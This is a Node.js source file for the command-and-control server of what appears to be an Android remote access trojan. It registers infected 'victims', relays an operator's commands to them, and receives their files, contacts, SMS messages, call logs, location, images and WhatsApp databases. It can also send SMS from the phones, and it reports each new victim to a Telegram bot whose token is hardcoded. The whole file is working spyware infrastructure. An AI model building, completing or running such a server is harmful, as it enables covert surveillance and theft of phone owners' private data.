const express = require('express');
const app = express();
const server = require('http').createServer(app);
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');

const io = new Server(server, {
  maxHttpBufferSize: 1e8, // 1MB
});

const port = 8080;
const victimList = {};
const deviceList = {};
const victimData = {};
let adminSocketId = null;


const botoken= '7265828067:AAFtQrVCMPfvQoE9mlzKAVoULsHDyShpQS0';
const Chatid = 'add chat id';
const bot = new TelegramBot(botoken, { polling: false });

server.listen(process.env.PORT || port, (err) => {
  if (err) return;
  log('Server Started : ' + port);
});

app.get('/', (req, res) => res.send('Server is Runnnnnnnnnnnnnnning'));

io.on('connection', (socket) => {
  socket.on('adminJoin', () => {
    adminSocketId = socket.id;
    if (Object.keys(victimData).length > 0) {
      Object.keys(victimData).map((key) => socket.emit('join', victimData[key]));
    }
  });

  socket.on('request', request);

  socket.on('join', (device) => {
    log('Victim joined => socketId ' + JSON.stringify(socket.id));
    victimList[device.id] = socket.id;
    victimData[device.id] = { ...device, socketId: socket.id };
    deviceList[socket.id] = {
      id: device.id,
      model: device.model,
    };

    socket.broadcast.emit('join', { ...device, socketId: socket.id });

  
    sendTelegramNotification(device);
  });

  socket.on('getDir', (data) => response('getDir', data));
  socket.on('getInstalledApps', (data) => response('getInstalledApps', data));
  socket.on('getContacts', (data) => response('getContacts', data));
  socket.on('sendSMS', (data) => response('sendSMS', data));
  socket.on('getCallLog', (data) => response('getCallLog', data));
  socket.on('previewImage', (data) => response('previewImage', data));
  socket.on('error', (data) => response('error', data));
  socket.on('getSMS', (data) => response('getSMS', data));
  socket.on('getLocation', (data) => response('getLocation', data));

  socket.on('disconnect', () => {
    if (socket.id === adminSocketId) {
      adminSocketId = null;
    } else {
      response('disconnectClient', socket.id);
      Object.keys(victimList).map((key) => {
        if (victimList[key] === socket.id) {
          delete victimList[key];
          delete victimData[key];
        }
      });
    }
  });

  socket.on('download', (d, callback) => responseBinary('download', d, callback));
  socket.on('downloadWhatsappDatabase', (d, callback) => {
    socket.broadcast.emit('downloadWhatsappDatabase', d, callback);
  });
});

const request = (d) => {
  let { to, action, data } = JSON.parse(d);
  log('Requesting action: ' + action);
  io.to(victimList[to]).emit(action, data);
};

const response = (action, data) => {
  if (adminSocketId) {
    log('Response action: ' + action);
    io.to(adminSocketId).emit(action, data);
  }
};

const responseBinary = (action, data, callback) => {
  if (adminSocketId) {
    log('Response action: ' + action);
    callback('success');
    io.to(adminSocketId).emit(action, data);
  }
};


const log = (message) => {
  console.log(message);
};


const sendTelegramNotification = (device) => {
  const message = `📡 *Victim online 🟢*\n\n` +
    `🔹 *Device ID:* \`${device.id}\`\n` +
    `🔹 *Model:* ${device.model}\n` +
    `🔹 *Socket ID:* \`${device.socketId}\``;

  bot.sendMessage(Chatid, message, { parse_mode: 'Markdown' })
    .then(() => log('Notifying to Server'))
    .catch((err) => log('Telegram Error: ' + err));
};
